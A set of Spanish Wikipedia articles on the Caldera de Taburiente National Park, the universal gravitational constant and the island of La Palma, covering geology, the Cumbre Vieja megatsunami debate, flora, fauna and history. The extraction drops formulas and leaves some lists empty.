El parque nacional de la Caldera de Taburiente es un área protegida de España, situada en la isla de La Palma, en la Comunidad Autónoma de Canarias. Como el resto del archipiélago, es de naturaleza volcánica, pero se distingue por la gran cantidad de recursos hídricos que posee, tanto subterráneos como superficiales.

Fue declarado Parque nacional el 6 de octubre 1954, siendo la segunda área protegida de Canarias en recibir esta designación, tras el Parque nacional del Teide en Tenerife y la cuarta de España. Además es desde 2002, Reserva Mundial de la Biosfera conjuntamente con toda la isla. Actualmente abarca una superficie de 46,9 km², que junto a la Zona Periférica de Protección comprende 59,56 km².

Se ubica en el centro de la isla coincidiendo con la formación geológica de la Caldera de Taburiente, de 7 km de eje máximo, y que es considerada la maravilla natural más emblemática de la isla. La depresión que forma la Caldera se encuentra entre los 600 y los 900 metros sobre el nivel del mar, mientras que la crestería que forma el cerco rocoso que la rodea alcanza los 2.426 metros en el punto más alto, el llamado Roque de los Muchachos, lugar en el que se ubica el Observatorio del Roque de los Muchachos.

Como todas las calderas y en los volcanes en escudo, su origen está en la existencia de un cráter relativamente extenso con lava que al enfriarse produce rocas basálticas. Las erupciones de las calderas son relativamente tranquilas del tipo hawaiano y la lava suele formar coladas sucesivas que van agrandando el volcán más en superficie que en altura. Pero al irse enfriando relativamente la lava en el cráter puede suceder que el mayor peso de la lava superficial ya solidificada origine la formación de un cono secundario, dentro de la caldera, como en el caso del Teide, o a un lado. 
En ambos casos, el resultado es el descenso del nivel en el interior del cráter, compensado por el crecimiento del cono volcánico, que al formar un estratovolcán, crece por los materiales volcánicos que va arrojando. En algunas ocasiones, el enfriamiento relativamente rápido de la lava en el cráter da origen a un aumento de presión que puede, a su vez, ocasionar una erupción explosiva. Pero otro proceso evolutivo de una caldera se produce por el derrame rápido de la lava en el interior del cráter. 
Este derrame puede producirse por una brecha abierta en la pared del cráter, con lo cual se conservan las paredes del cráter original, o por un derrame de lava líquida cuando esa lava abre una brecha en el borde superior, como parece ser el caso de la caldera de Taburiente, y como sucedió en la Caldereta, también en la isla de La Palma. Todos estos procesos en sus distintos estadios de evolución pueden verse en las imágenes de satélite de las islas Galápagos, cuyos volcanes son casi sin excepción en escudo o calderas. La Caldera de Taburiente se formó hace unos 2 millones de años y la erosión fluvial solo tuvo lugar después de haberse producido el derrame de lava ya que no podría haber ocasionado por sí sola esta enorme cicatriz en la isla. Además, la erosión fluvial hubiera originado una playa por la acumulación de materiales detríticos, cosa que no ocurre con los derrames de lava líquida de grandes proporciones. Por estos motivos se puede ver en el inicio del Barranco de las Angustias que los dos últimos afluentes en las paredes originales de la caldera drenan hacia el centro de la misma, lo que no podría explicarse mediante una erupción explosiva. 
Tampoco la forma del cauce del Barranco de las Angustias parece confirmar la tesis de una erupción explosiva ya que en este caso, la cicatriz en las paredes del volcán sería más pequeña al principio y mucho más extensa hacia afuera, justo lo contrario de lo que ocurre en este caso. Más bien la breve playa del Puerto de Tazacorte es de origen fluvial y posterior a la formación del Barranco de las Angustias, en cuyo fondo, descubierto en algunos puntos por las aguas fluviales, encontramos rocas netamente basálticas.

El agua constituye una de las bellezas naturales de este Parque nacional y de este paisaje volcánico: numerosas fuentes brotan, formando al unirse sus corrientes, riachuelos y caprichosas cascadas. Sirva de ejemplo el "Salto de la Desfondada" tiene una caída de unos 150 m.

En la mayoría de las fuentes encontramos aguas limpias y cristalinas, pero existen también otras alteradas en su composición por gran cantidad de materiales, como las procedentes del "Barranco de Almendro Amargo", de un color amarillo rojizo debido a los materiales férricos de la zona. Las dos cuencas hidrológicas principales son las de Taburiente y Almendro Amargo, las cuales confluyen en el punto donde se inicia el Barranco de las Angustias, única salida natural de la Caldera.

Desde el año 1557 hasta hoy la Caldera es propiedad de la Comunidad o Heredad de las Haciendas de Argual y Tazacorte.

Uno de los principales objetivos de gestión establecidos en el "Plan Rector de Uso y Gestión" (PRUG) de la Caldera es la puesta en marcha de programas de rescate genético de las especies en peligro de extinción de la zona, ya que este Parque posee numerosos endemismos, y muchos de ellos en peligro.

La especie que predomina y configura el paisaje es el pino canario ("Pinus canariensis"), una de las peculiaridades del pino canario es que tolera los incendios gracias a su adaptación milenaria al fuego producido por las erupciones volcánicas: se quema la corteza pero internamente sigue viviendo. Acompañando al pino canario se encuentra el amagante ("Cistus symphytifolius"), estas especies endémicas de las Islas canarias son estupendas colonizadoras de suelos muy pobres y han proliferado en estos inhóspitos suelos volcánicos.

Encontramos también otras jaras ("Cistus monspeliensis") a cuyos pies crece una planta parásita prácticamente enterrada, la batatilla o vaquita ("Cytinus hipocistis").

En el interior de la caldera está presente la laurisilva: formaciones de faya y brezo que en Canarias se denomina monte verde, de gran importancia ecológica pues es fuente abundante de abono orgánico y agente condensador de las brumas que se forman en la Caldera, aportando agua al terreno. Tenemos así la faya o haya de Canarias ("Myrica faya") y el brezo ("Erica arborea").

En el interior de los barrancos donde la humedad es más abundante en los restos del bosques de lauráceas: acebiño ("Ilex canariensis"), loro o laurel ("Laurus azorica"), barbusano ("Apollonias canariensis"), viñátigo ("Persea indica") o el marmolán ("Myrsine canariensis").

Otras especies frecuentes son el sauce canario ("Salix canariensis"), el tajinastes ("Echium"), el helecho común ("Pteris aquilina"), el bejeque ("Aeonium", "Greenovia", "Aichryson"), la tabaiba ("Euphorbia"), el verodes ("Senecio kleinia").

Por encima de los 1.700 metros podemos encontrar el codeso ("Adenocarpus viscosus"), el cedro de Canarias ("Juniperus cedrus"), el pensamiento de las cumbres ("Viola palmensis"), el tajinaste azul ("Echium gentianoides"), o el retamón ("Teline benehoavensis").

La mayor parte de la fauna del parque está representada por artrópodos, principalmente insectos, aún insuficientemente estudiados y se ignora cuantas especies diferentes puede haber; como en el resto de grupos taxonómicos los endemismos son abundantes. Abundan la escolopendra, que alcanza un tamaño de casi un palmo de longitud, y la araña lobo. A una altura de 2000 m existe una cueva donde vive un escarabajo cavernícola endémico de la Palma, tiene como peculiaridad que ha perdido los ojos y la pigmentación.

La fauna vertebrada es escasa y la mayoría son especies introducidas a excepción de los murciélagos, algunos anfibios, reptiles y peces. 

Mamíferos: el arruí, las cabras, los conejos, que son una grave amenaza para las plantas endémicas, algunos gatos asilvestrados y cuatro especies de murciélagos como el murciélago rabudo , el murciélago orejudo canario , el murciélago de montaña y el murciélago común . 

Aves: como el cernícalo ("Falco tinnunculus canariensis"), la paloma bravía ("Columba livia canariensis"), la paloma rabiche ("Columba junoniae"), la graja o chova piquirroja ("Pyrrhocorax pyrrhocorax barbarus"), el cuervo ("Corvus corax tingitanus"), el mirlo ("Turdus merula agnetae"), herrerillos ("Parus caeruleus palmensis"), o la curruca capirotada ("Sylvia atricapilla atricapilla"). 

Anfibios: la ranita meridional ("Hyla meridionalis") y la rana común ("Pelophylax perezi").

Reptiles: el perenquén de Delalande o salamanquesa ("Tarentola delalandii")o el lagarto tizón ("Gallotia galloti").

De los cuatro Parques Nacionales con los que cuenta el Archipiélago Canario, el Parque Nacional de la Caldera de Taburiente, es actualmente, el que menos visitas recibe al año, tras el Parque Nacional del Teide en Tenerife, el Parque nacional de Timanfaya en Lanzarote y el Parque nacional de Garajonay en La Gomera. A nivel nacional, es el noveno con 445.084 visitantes (2015), tras; El Teide, Guadarrama, Picos de Europa, Timanfaya, Sierra Nevada, Garajonay, Ordesa y Monte Perdido y Aiguas Tortas y Lago de San Mauricio.




</doc>
<doc id="6466" url="https://es.wikipedia.org/wiki?curid=6466" title="Constante de gravitación universal">
Constante de gravitación universal

La constante de gravitación universal ("G") es una constante física obtenida de forma empírica, que determina la intensidad de la fuerza de atracción gravitatoria entre los cuerpos. Se denota por "G" y aparece tanto en la ley de gravitación universal de Newton como en la teoría general de la relatividad de Einstein. La medida de "G" fue obtenida implícitamente por primera vez por Henry Cavendish en 1798. Esta medición ha sido repetida por otros experimentadores aportando mayor precisión. 

Aunque "G" fue una de las primeras constantes físicas universales determinadas, debido a la extremada pequeñez de la atracción gravitatoria, el valor de "G" se conoce solo con una precisión de 1 parte entre 10.000, siendo una de las constantes conocidas con menor exactitud. Su valor aproximado es:

La constante de la gravitación que se expone en la teoría newtoniana de la gravitación puede calcularse midiendo la fuerza de atracción entre dos objetos, de un kilogramo cada uno, separados a un metro de distancia. Newton formuló la siguiente ley, conocida como ley de gravitación universal: 
la cual puede ser expresada vectorialmente de la forma:

</math>
donde formula_1 es la constante de gravitación universal cuyo valor es: 

Solo se sabe con certeza que son correctas las primeras cifras decimales: se trata de una de las constantes físicas que han sido determinadas con menor precisión. Esto ocasiona dificultades a la hora de medir con precisión la masa de los diferentes cuerpos del Sistema Solar, como el Sol o la Tierra. Y otras constantes derivadas como la constante de Einstein.

La primera medición de su valor ha sido atribuida en muchas ocasiones a Henry Cavendish, en el experimento de la balanza de torsión descrito en las "Philosophical Transactions" de 1798 publicadas por la Royal Society. Sin embargo Cavendish no pretendía obtener el valor de G, sino medir la densidad de la Tierra —que resultó «ser 5.48 veces la del agua»—, sin hacer ninguna referencia a la constante G o a Newton, aunque sí aplicó la ley propuesta por él para comparar fuerzas gravitatorias entre masas diferentes.

"G", la constante de gravitación universal, no debe ser confundida con "g", letra que representa la intensidad del campo gravitatorio de la Tierra, que es lo que habitualmente recibe el nombre de «gravedad» y cuyo valor sobre la superficie terrestre es de aproximadamente 9.8 m/s.

En teoría de la relatividad aparece otra constante llamada constante de la gravitación de Einstein, que viene dada por:

Esta constante es el factor de proporcionalidad entre el tensor de curvatura de Einstein (que es una medida de la intensidad del campo gravitatorio) y el tensor energía-impulso de la materia que provoca el campo:

El equivalente clásico de esta última ecuación es la ecuación de Poisson para el potencial gravitatorio:



</doc>
<doc id="6469" url="https://es.wikipedia.org/wiki?curid=6469" title="La Palma">
La Palma

La Palma, cuyo nombre histórico es San Miguel de La Palma, es una isla del océano Atlántico perteneciente a la Comunidad Autónoma de Canarias (España). Junto a Tenerife, La Gomera y El Hierro conforma la provincia de Santa Cruz de Tenerife. Con una superficie de 708,32 km² y una población de 81.350 habitantes (INE 2017) ocupa el quinto lugar tanto en extensión como en población en el Archipiélago Canario. Además, es la segunda isla de Canarias en altitud, con los 2.426 metros del Roque de los Muchachos.

La ciudad de Santa Cruz de La Palma es la capital de la isla, sin embargo, el municipio más poblado de la isla es Los Llanos de Aridane con una población de 20.043 habitantes (INE 2017).

Desde 2002, toda la isla es Reserva de la Biosfera, siendo tras Lanzarote, y El Hierro la tercera isla canaria a la que la Unesco reconoce con esta protección. En el centro de la isla se ubica el Parque Nacional de la Caldera de Taburiente, donde se encuentra el mayor cráter volcánico del mundo. La Caldera de Taburiente también es uno de los cuatro parques nacionales con los que cuenta las Islas Canarias.

La isla tiene una superficie de 708,32 km² (9,45% del territorio canario) y una población censada de 87.324 habitantes (INE, enero de 2010). Su territorio es muy abrupto, alcanzando los 2.426 m en el Roque de los Muchachos, punto más elevado de la isla, que la convierte, tras Tenerife, en la segunda isla con mayor altitud de Canarias. 

En el tercio norte de La Palma se encuentra una gran depresión de origen erosivo que forma la Caldera de Taburiente, declarada Parque Nacional en 1954. Desde el centro de la isla hasta el sur, en la llamada Cumbre Vieja, en ella se encuentra una serie de volcanes entre los que se destacan el Volcán de San Antonio, Volcán de San Juan y el Teneguía (última erupción volcánica terrestre de España en 1971). La Palma también posee el Parque Natural de Cumbre Vieja y el Parque Natural de Las Nieves, así como una serie de entidades protegidas de menor tamaño y grado de protección.

En 1983, la zona de "El Canal y Los Tilos" es declarada como Reserva de la biosfera por la Unesco. Esta área se amplió en 1997 para formar la "Reserva de la Biosfera de Los Tilos". Finalmente, en 2002, se extendió la reserva a toda la isla con la denominación de Reserva de la Biosfera de La Palma.

La Palma es una de las islas canarias con mayor superficie boscosa, tanto de pinos como de laurisilva. En cuanto a la agricultura, los cultivos principales son el plátano de Canarias y la vid.

En la actualidad, el municipio más poblado de la isla es Los Llanos de Aridane, que supera en este respecto a la capital insular Santa Cruz de La Palma, siendo por lo tanto, la única isla canaria cuyo municipio más poblado no es el de la capital insular.

La Palma está dividida en 14 municipios:

La Palma, como el resto de Canarias, es una isla de origen volcánico. Con una edad geológica estimada en 2 millones de años, es una de las más jóvenes del archipiélago. Surgió de un volcán submarino situado a 4.000 metros bajo el nivel del mar. El edificio volcánico de la isla posee una altitud de 6.500 m desde la plataforma abisal del Atlántico, encontrándose en él todos los tipos de rocas volcánicas.

La isla se divide en dos zonas climáticas bien diferenciadas mediante una cadena de volcanes denominada Cumbre Vieja. En la zona sur existen volcanes todavía en activo. La última erupción tuvo lugar en 1971 en la punta meridional de la isla, en el municipio de Fuencaliente. De esa erupción surgió el volcán Teneguía, que sigue estando en el punto de mira de los científicos por seguir candente. La zona norte está dominada por la Caldera de Taburiente, una caldera submarina creada por erupciones y la erosión, que emergió hasta una altura de 3.500 msnm. Esta caldera es el mayor cráter emergido del mundo. El interior de la caldera se vació en el pasado geológico por una rápida emisión de lava a través de una brecha que se abrió cerca del actual Balcón de Taburiente en lo que es hoy el Barranco de las Angustias. Las huellas de esta emisión de lava pueden verse en el interior de la caldera, ya que dichas huellas (barrancos en las paredes internas) están orientadas hacia el centro del cráter y no hacia el exterior, como hubiera sucedido en un cráter con erupciones explosivas (como sucedió en el Mount Saint Helens) (). La caldera mide 9 km de diámetro, 28 de circunferencia y 1.500 m de profundidad. La única salida que presenta es el "Barranco de las Angustias", lugar por el que sólo se puede acceder a pie. En ella sólo residen dos personas encargadas de las tomas de agua. En 1954 se creó el Parque nacional de la Caldera de Taburiente.

Se encuentra rodeada por picos de entre 1.700 y 2.400 m de altitud, en los que está situada la mayor altitud de la isla, el Roque de los Muchachos, con 2.426 msnm. En este pico se encuentra el Observatorio del Roque de los Muchachos.


Los datos de estas erupciones se han obtenido a través de los cráteres, los campos de cenizas y la longitud de las coladas de lava.

La actividad volcánica es un riesgo constante. Aunque está concentrada en la zona sur de la isla, existen teorías que predicen que una erupción podría volver inestable la zona occidental de la isla y caer al mar. Un estudio de los años 90 descubrió que la Cumbre Vieja se encuentra llena de agua, debido a la porosidad de la piedra. Pero en realidad, la característica explosiva de un volcán se encuentra en la mayor o menor temperatura de la lava: si esta es muy alta, la lava (como la que hay normalmente en una caldera), es muy líquida, lo que disminuye el carácter explosivo de sus erupciones y aumenta la posibilidad de los derrames, bien sea abriendo una brecha en la parte superior del cráter, o saliendo a través de una abertura en la pared del cráter.

Existe una teoría según la cual una erupción volcánica podría calentar el agua que se encuentra dentro de la Cumbre Vieja haciendo que esta colapsase. Afortunadamente, la explosión por vapor de agua en el interior de un volcán o caldera es más bien un fenómeno raro, ya que suele predominar la formación de géiseres en este caso. En algunos casos de las Islas Canarias (como sucede en Lanzarote) se da esta posibilidad, aunque por la sequedad del clima es necesario arrojar un balde de agua en una abertura para que se produzca la erupción de vapor.

En la erupción de 1949 se pudo comprobar cómo se abrió una falla, de forma que la parte sur de la isla se hundió cuatro metros en el Atlántico, lo que apoya esta teoría. En caso de cumplirse, es posible que se generase un megatsunami de dimensiones catastróficas.
Por otro lado, otros científicos estiman que lo que puede suceder es que la zona occidental de la isla se fragmente en partes pequeñas, como ocurrió en 1949, sin llegar a generar ningún tsunami o provocando una ola de menor intensidad.
En cualquier caso, la mayoría de los científicos aboga porque no hay ningún indicio actual que lleve a pensar que este hecho pueda ocurrir en las próximas décadas. La historia geológica fácilmente comprobable en la isla de La Palma sustenta esta idea, ya que es una isla extraordinariamente volcánica, con centenares de cráteres de todos los tipos y tamaños () y ello no justifica una explosión gigantesca en la isla por el hecho de que no existe una cámara magmática común a todos estos cráteres. Es decir, la erupción de un volcán en La Palma no suele afectar a otros volcanes aunque se encuentren muy cerca, lo que nos indica que la fuerza expansiva de esas erupciones se tendría que repartir en una gran cantidad de aberturas para afectar toda la isla.

En un documental de la serie "Horizon" de la "BBC" emitido el 12 de octubre de 2000, dos geólogos (Day and McGuire) citaron la brecha como prueba de que la mitad de la Cumbre Vieja se había deslizado hacia el océano Atlántico (Day et al., 1999; Ward y Day, 2001). Sugirieron que este proceso fue impulsado por la presión causada por el aumento del magma calentando el agua atrapada dentro de la estructura de la isla. La hipótesis sugerida establecía que en una futura erupción, el flanco occidental de la Cumbre Vieja, con una masa de aproximadamente 1,5 x10 kg, podría deslizarse hacia el océano. Esto podría generar una ola gigante, desencadenando un "mega-tsunami" de 900 m de altura en la región de las islas. La ola se desplazaría a través del Atlántico e inundaría la costa este de América del Norte como la de Estados Unidos de América, el Caribe y el norte de las costas de América del Sur alrededor de seis a ocho horas más tarde. Estimaron que el tsunami tendría posiblemente olas de 1000 pies o más alto y causaría una enorme devastación a lo largo de las costas. En modelos representados se indicó que el tsunami podría inundar hasta 25 km tierra adentro - dependiendo de la topografía. La teoría de Ward and Day (1999) dio como resultado el colapso de una porción mucho mayor del flanco occidental de la superficie fisuras visibles actualmente es inestable se sugieren pruebas de la cartografía geológica de Day et al. 1999. En este documento sostienen que una gran parte del flanco occidental se ha construido en la cicatriz de una caída anterior y, por tanto, se sienta sobre desechos inestables.

Esto también fue motivo de un docu-drama de la BBC llamado "Fin de los Días" que pasó por varios escenarios hipotéticos de proporciones desastrosas.

Sin embargo, la Sociedad Tsunami (Pararas-Carayannis, 2002), publicó una declaración indicando que "..."Nos gustaría detener el alarmismo infundado de estos informes"..." Los principales puntos planteados en este informe incluyen:


Otros estudios también en desacuerdo con la hipótesis de Day "y otros"; (1999) y Ward y Day (2001).

Sin embargo, existe un consenso por los geólogos y vulcanólogos de que el ""edificio"" de una isla volcánica puede sufrir grandes modificaciones, levantamientos o hundimientos y que se pueden haber producido grandes tsunamis en el Atlántico en el pasado geológico. A pesar de ello todavía no hay evidencia confiable que demuestre una causa y efecto. Todos los documentos acerca de los tsunamis a gran escala en el Atlántico se han atribuido a los terremotos y no a los volcanes (el caso del hundimiento de Port Royal en Jamaica o el terremoto de Lisboa en el siglo XVIII, por ejemplo). ((Datos | fecha = agosto 2007)) La prueba de depósitos de tsunami se ha informado desde el Caribe y las Islas Canarias. Desde el decenio de 1990 la zona ha sido (y sigue siendo), el control y la circulación no se ha detectado. ((Datos | fecha = 2007)) agosto en curso y recientes (2008) el seguimiento demuestra que las dimensiones de acuerdo con los registrados en 1949. Lo que indica que el bloque no se ha movido desde 1949 ((Datos | fecha = agosto 2007)).

Datos para Santa-Cruz de La Palma

Datos para Los Gallegos (Barlovento)

Datos para Tazacorte

Debido a su formación y localización, La Palma presenta una gran variedad de paisajes, debido a la diversidad de ecosistemas que presenta, desde los áridos costeros hasta la muy húmeda formación boscosa de la laurisilva, además de bosques de pinares y un ecosistema de alta montaña. Toda esta diversidad le ha dado los sobrenombres de "La Isla Bonita" y "La Isla Verde".

La isla no sólo recibe agua a través de precipitaciones, sino que además y lo hace a través de la lluvia horizontal. Los vientos alisios traen nubes a una cota baja chocando con el relieve de forma constante durante casi todo el año, formando brumas que la vegetación, especialmente la laurisilva, condensa, produciendo este fenómeno conocido como lluvia horizontal. Un ejemplo de aprovechamiento de este hecho en las especies vegetales, es el caso del pino canario, que al tener sus hojas en forma de agujas actúan como filtro condensador y permiten que la bruma precipite sobre el pie del árbol.

Las formaciones boscosas de la palma se forman según su altitud y orientación que desde los campos de lava a los bosques de laurisilva, pasando por zonas de pinares, vegetación termófila, vegetación de cumbre y costera. Entre las plantas que crecen en la isla, 170 son endémicas de Canarias, siendo las más características el Drago, el Pino Canario y la Palmera Canaria.

La vegetación puede dividirse en una serie de pisos más o menos diferenciados, en torno a las dos vertientes de la isla, siendo por lo general más húmeda en la zona oriental que la occidental, y así mismo, más seca también en la meridional que en la septentrional.
Vertiente Oeste:

Vertiente Este:

Los Paisajes de la isla se componen de cuatro colores principales, el negro del basalto y la lava solidificada en forma de malpaís, el rojo de la toba volcánica, el verde de la densa vegetación y el eterno azul del océano Atlántico y del limpísimo cielo. De norte a sur de la isla, con mayor predominio en la mitad norte, existen barrancos profundos por donde discurre el agua depositada en las cumbres. En la zona norte y central se encuentran bosques de pinos y fayal-brezal, en la zona noreste laurisilva y en la zona sur-suroeste, tierras volcánicas debido a la reciente actividad volcánica. Sin embargo, esto es una leve aproximación de lo que puede dar de sí la isla, teniendo paisajes tan espectaculares como son el mar de nubes o las majestuosas laderas interiores de la Caldera de Taburiente, entre muchos otros.

Destaca por encima de todo el Parque Nacional de la Caldera de Taburiente, situado en el centro norte de la isla, coincidiendo con el accidente geográfico de La Caldera de Taburiente, de 7 km de eje máximo. Aparte de sus magníficas vistas, tiene aspectos realmente llamativos como son el Roque Idafe o el riachuelo de La Caldera, única corriente de agua continua de las islas Canarias. En cuanto a la vegetación, el Pino Canario es el rey casi absoluto en toda la Caldera.
La isla de La Palma concentra los únicos torrentes de caudal continuo de las Islas Canarias y se encuentran dentro de este parque nacional.

También es de gran atractivo turístico la Ruta de Los Volcanes, que recorre la mitad sur de la isla a través de la dorsal montañosa, atravesando enormes volcanes extintos rodeados de una serie de paisajes volcánicos espectaculares.

Destacan así mismo, unas piscinas naturales llamadas La Fajana, y situadas en el municipio de Barlovento, son de agua salada, procedente íntegramente del mar que está justo al lado. Este conjunto cuenta con 3 piscinas, situadas a distintos niveles, y con escaleras para facilitar el baño. Cuenta con una piscina para minusválidos pero actualmente no está en uso. Incluyendo esta serían cuatro piscinas, siendo esta última artificial.

Entre las especies endémicas de la isla se encuentra:


Según una ley del Gobierno de Canarias, los símbolos naturales de la isla son la graja y el pino canario.

Desde 1983, el bosque de laurisilva "Los Tilos" está catalogado como Reserva de la Biosfera por la Unesco. En 2002 se amplió esta declaración a toda la isla. La Palma fue la primera isla canaria en albergar un lugar de este tipo. Por otro lado se encuentra el Parque Nacional de la Caldera de Taburiente así como otros entornos sujetos a diferentes fórmulas de conservación según establece la Red Canaria de Espacios Naturales Protegidos.

EL Gobierno de Canarias aprobó el Plan Territorial Especial del Uso Turístico de La Palma (PTE), que incluye la construcción, en los próximos años, de 4 a 5 campos de golf de 18 hoyos con sus respectivos hoteles y villas de lujo. Uno de ellos, el Aridane Golf, invadiría el Paisaje Protegido de Tamanca, que además es Lugar de Interés Comunitario (LIC) con varias especies endémicas de fauna y flora en peligro de extinción. El proyecto tiene dos sentencias desfavorables del Tribunal Superior de Justicia de Canarias (TSJC). Los demás proyectos también afectan a LICs, Zonas de Especial Protección de las Aves (ZEPAs) y Parques Naturales. El documento del PTE también permite la construcción de varios puertos deportivos, marinas y hoteles de turismo convencional en zonas vírgenes del litoral palmero. Se presentaron miles de alegaciones en contra de dichos planes, por ir en contra de los objetivos de la Reserva Mundial de la Biosfera de La Palma, de un turismo sostenible y respetuoso con la naturaleza y por perjudicar directamente a espacios naturales protegidos y sus especies endémicas de fauna y flora en peligro de extinción.

Más recientemente, el Gobierno de Canarias ha aprobado la ley de Medidas Urgentes en materia de Ordenación del Turismo cuyas enmiendas 39 y 40, permiten la construcción de infraestructuras turísticas en el interior de espacios naturales protegidos, contraviniendo las leyes medioambientales de Canarias, de España y comunitarias. Los biólogos de la Reserva Mundial de La Palma han advertido del mal estado de los fondos marinos, debido sobre todo a una sobrepesca, que sigue utilizando artes poco selectivas y agresivas como son las nasas. La consecuencia más directa de la falta de control de la pesca es la proliferación del erizo de Lima, plaga que destruye la cobertura algal dejando tras de sí un yermo blanquizal. La creación de la reserva marina de Fuencaliente ha servido para recuperar en esa franja litoral las poblaciones más importantes de peces, aunque los pescadores, al acecho en sus límites, no permiten la recuperación de otras zonas adyacentes.

Otras amenazas podrían empeorar la situación actual de las costas palmeras: proyectos de puertos deportivos y marinas; aumento de la urbanización del litoral o instalación de jaulas flotantes para acuicultura.

A lo largo de la historia La Palma ha recibido numerosos nombres. Puede que la "Junonia Maior" que aparece en el texto de Plinio el Viejo haga referencia a La Palma. También recibe, tradicionalmente, el nombre de San Miguel de La Palma. Los aborígenes la denominaban "Benahoare (mi tierra)". Actualmente son muy populares los sobrenombres de: "La Isla Bonita", "La Isla Verde" o "La Isla Corazón".

Los primitivos habitantes de La Palma eran los benahoaritas, auaritas o awaras. En el momento de la conquista, estaba dividida en 12 cantones. Los primeros textos sobre La Palma datan de la Baja Edad Media (siglos XIV y XV). Aunque faltan datos concretos al respecto, se calcula que la población en ese momento, podía oscilar en torno a los 4.000 habitantes. Los aborígenes vivían fundamentalmente del pastoreo de cabras, ovejas y cerdos y recolectaban frutos y raíces con los que elaboraban una especie de harina a la que llamaban "gofio", hecha con raíces de helecho y amagante, que tostaban y molían.

La hipótesis más aceptada sobre el origen de los aborígenes de la isla de la Palma los vincula a tribus bereberes provinentes del noroeste del continente africano. Se desconoce si llegaron a la isla por su propia voluntad o expulsados de sus lugares de origen por invasores como los (romanos o fenicios). Los restos hallados en los yacimientos muestran que la estatura media era de 1,70 metros para los hombres y de 1,65 metros para las mujeres.
Muchos historiadores han destacado la belicosidad de los aborígenes (como sucedía también con los guanches de Tenerife). Estos tenían con mucha frecuencia guerras civiles y todo tipo de enfrentamientos, que no se restringían a un cantón sino que con frecuencia afectaban a toda la isla. Un ejemplo de fuerte confrontación es el de la que tuvo lugar entre Atogamtoma (señor de Tijarafe) con Tanausú (Aceró) o Mayantigo (Aridane).

Los aborígenes palmeros también tenían un sistema de gobierno que aunque primitivo permitía discutir sin peleas muchos de los problemas existentes, esta institución era el "Tagoror". Asimismo, dentro de la comunidad se le daba mucha importancia a la familia y permitía unir a varios miembros en grupos por mismo linaje de sangre. Esta unión podría ser de primer orden o nuclear (padres e hijos), o también retrospectiva o extensiva (un antepasado común).

Se cree que el pueblo benahorita tenía una historia de alrededor de unos 2.000 años, hasta que, en 1493, Alonso Fernández de Lugo desembarcó en la isla con la intención de conquistarla. La Palma fue la penúltima isla canaria en ser conquistada poco antes de Tenerife (1496). La conquista puso fin a las guerras intestinas de los aborígenes tanto en La Palma como en Tenerife.

Si bien, dependiendo de las fuentes los datos pueden cambiar, aparecen en ocasiones subdivisiones internas o distintos topónimos para designar un mismo territorio, suele aceptarse que los 12 cantones o segmentos en los que se dividía la isla y sus respectivos señores -señalados entre paréntesis- en el momento de la conquista eran:


A diferencia de Tenerife o Gran Canaria, en La Palma no existía ninguna superestructura por encima de estas unidades. De hecho este sistema de poder no es permanente y estas unidades o segmentos podían estar divididas en otras más pequeñas (en las propias fuentes del siglo XVI se hace referencia a otras unidades como el "bando de Gazmira").

A partir del siglo XVI, la colonización de La Palma ofrece a los nuevos pobladores posibilidades diversas de progreso económico: tierras de cultivo, entrada en el circuito comercial entre América y Europa y el abastecimiento de manufacturas a las islas. Junto a los pobladores españoles llegarán portugueses, genoveses, franceses y flamencos, que se mezclarán con los indígenas que quedaron tras la conquista. Se dedicarán principalmente a la agricultura, que va a girar en torno a la producción y comercio de monocultivos de exportación, beneficiados del clima canario y cuyo control generará grandes fortunas.

El primero de estos productos será la caña de azúcar, que a partir de la segunda mitad del siglo XVI será sustituido por los vinos canarios. Asimismo, llegarán grupos de población morisca y negros africanos, capturados para utilizarlos como esclavos en las plantaciones, o como mano de obra en el uso de maquinaria agrícola, a pesar de una carta papal de 1434, en la que Eugenio IV los declaraba "gente libre", prohibiendo el tráfico de hombres en la isla. En 1514, cuando se les equiparó en derechos, fueron siendo bautizados, mezclándose con los colonos europeos.

La caña de azúcar fue introducida por Alonso Fernández de Lugo. Los territorios de la isla fueron divididos entre mercaderes, agricultores y artesanos europeos. De esta forma, en 1508, Juan Fernández de Lugo vendió sus cultivos de caña de azúcar así como reservas de agua en Tazacorte y Argual un andaluz apellidado Dinarte; éste los vendió un año más tarde a la Familia Welser, que los transmitiría al belga Jakob Groenenberch ("Jacobo Monteverde"), que terminaría por vendérselos a su compatriota Van de Valle.

A partir de 1553, el cultivo de la caña de azúcar dejó de ser rentable debido a la producción en masa proveniente de América Central y Sudamérica. Muchas de las plantaciones pasaron a dedicarse a la producción del vino. El vino de malvasía producido por los suelos volcánicos jóvenes del sur de la isla se convirtió en la principal exportación de la isla. El principal cliente de los vinos palmeros fue Inglaterra. El esplendor del vino palmero duró hasta el siglo XIX, cuando hubo un declive provocado por el cambio de gustos de los consumidores. Sin embargo, aún hoy en día se sigue cultivando y produciendo vino de malvasía aunque no sea el vino preferido por las masas de consumidores.

En el siglo XVI recibió La Palma, tras Amberes y Sevilla, el privilegio del comercio con América. El puerto de Santa Cruz de La Palma se convirtió enseguida en uno de los puertos más importantes del Imperio español. Esta nueva fuente de riqueza atrajo a su vez a los piratas que atacaban la isla para apropiarse de los tesoros llegados de las Indias. François Le Clerc y su grupo de piratas franceses tomaron la ciudad en 1553 robando todo lo transportable y quemando lo que no era posible de transportar. Tras esa catástrofe hubo que reconstruir las casas, iglesias y conventos de la ciudad así como sus fuertes defensivos. Con las nuevas defensas, se pudo rechazar el ataque de Francis Drake de 1585, el cual no pudo llegar a desembarcar. 

El comercio con América también generó otra serie de actividades como los astilleros. Santa Cruz de La Palma atrajo a muchos comerciantes extranjeros (flamencos, franceses, castellanos, italianos, portugueses, etc.) dándole a la localidad un aire internacional. Las calles con nombres extranjeros son aún hoy testigos de esa época, como la calle O'Daly (irlandés) o la calle Vandale (flamenco). El declive comenzó a mediados del siglo XVII debido a una concesión de 1657 que obligaba a todos los barcos con destino América a registrarse en Tenerife. En 1778, Carlos III abrió todos los puertos de España al comercio con América, impidiendo que Santa Cruz de La Palma se recuperara de la crisis económica en la que se encontraba inmersa en aquellos momentos.

